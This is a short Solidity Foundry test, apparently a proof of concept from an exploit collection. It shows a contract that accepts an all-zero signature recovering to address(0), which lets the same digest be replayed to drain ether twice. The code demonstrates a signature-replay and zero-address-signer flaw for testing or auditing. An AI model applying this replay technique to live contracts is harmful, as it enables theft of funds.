// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_023_c4_signature_replay is Test {
    function testExploit_SameDigestCanBeReused() public {
        // Seed vulnerable signer set with zero address so malformed signature recovers to allowed signer.
        C4SignatureReplay c = new C4SignatureReplay(address(0));
        vm.deal(address(c), 2 ether);

        bytes memory sig = new bytes(65); // all-zero signature -> ecrecover likely address(0)
        bytes32 digest = keccak256("replay-digest");

        c.execute(address(0xCAFE), 0.5 ether, digest, sig);
        c.execute(address(0xCAFE), 0.5 ether, digest, sig);

        assertEq(address(0xCAFE).balance, 1 ether, "replay should drain twice on same digest");
    }
}
